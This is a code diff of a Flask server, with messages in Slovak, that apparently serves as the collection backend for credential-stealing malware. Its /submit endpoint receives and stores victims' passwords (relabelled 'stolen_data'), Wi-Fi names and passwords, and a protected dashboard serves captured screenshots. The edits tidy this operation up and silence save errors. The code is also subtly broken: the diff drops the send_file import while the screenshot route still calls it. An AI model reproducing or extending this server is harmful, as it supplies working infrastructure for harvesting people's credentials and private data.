@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify, render_template, redirect, url_for, session, send_file
+from flask import Flask, request, jsonify, render_template, redirect, url_for, session
 from functools import wraps
 import os
 import json
@@ -23,8 +23,8 @@ def save_data(data):
     try:
         with open(DATA_FILE, "w", encoding="utf-8") as f:
             json.dump(data, f, indent=2, ensure_ascii=False)
-    except Exception as e:
-        print(f"Chyba pri ukladaní: {e}")
+    except:
+        pass
 
 def login_required(f):
     @wraps(f)
@@ -39,32 +39,27 @@ def submit_data():
     try:
         data = request.json
         if not data:
-            return jsonify({"error": "No JSON data received"}), 400
+            return jsonify({"error": "No data"}), 400
 
-        # Pridáme čas prijatia
         data['received_at'] = datetime.utcnow().isoformat() + "Z"
-
-        # Kompatibilita s klientom
+        
+        # Kompatibilita
         if 'passwords' in data:
             data['stolen_data'] = data.pop('passwords')
-        elif 'stolen_data' not in data:
+        if 'stolen_data' not in data:
             data['stolen_data'] = []
-
-        if 'ssid' in data:
-            data['wifi_ssid'] = data.pop('ssid')
         if 'wifi_password' not in data:
             data['wifi_password'] = None
 
-        # Uložíme dáta
         current_data = load_data()
         current_data.append(data)
         save_data(current_data)
         
-        print(f"✅ Dáta prijaté: {data.get('user', 'Unknown')} | WiFi: {data.get('wifi_ssid')} | Hesiel: {len(data.get('stolen_data', []))}")
+        print(f"✅ {data.get('user')} | WiFi: {data.get('wifi_ssid')} | {len(data.get('stolen_data', []))} hesiel")
         return jsonify({"status": "ok"}), 200
         
     except Exception as e:
-        print(f"❌ Server chyba /submit: {e}")
+        print(f"❌ /submit: {e}")
         return jsonify({"error": str(e)}), 500
 
 @app.route('/login', methods=['GET', 'POST'])
@@ -77,7 +72,7 @@ def login():
             session['logged_in'] = True
             return redirect(url_for('dashboard'))
         else:
-            error = "Nesprávne meno alebo heslo"
+            error = "❌ Nesprávne meno alebo heslo!"
     return render_template('login.html', error=error)
 
 @app.route('/logout')
@@ -113,7 +108,7 @@ def screenshot(index):
         return "No screenshot", 404
     try:
         img_bytes = base64.b64decode(b64)
-        return send_file(BytesIO(img_bytes), mimetype='image/png', download_name=f"screenshot_{index}.png")
+        return send_file(BytesIO(img_bytes), mimetype='image/png')
     except:
         return "Invalid screenshot", 404
 
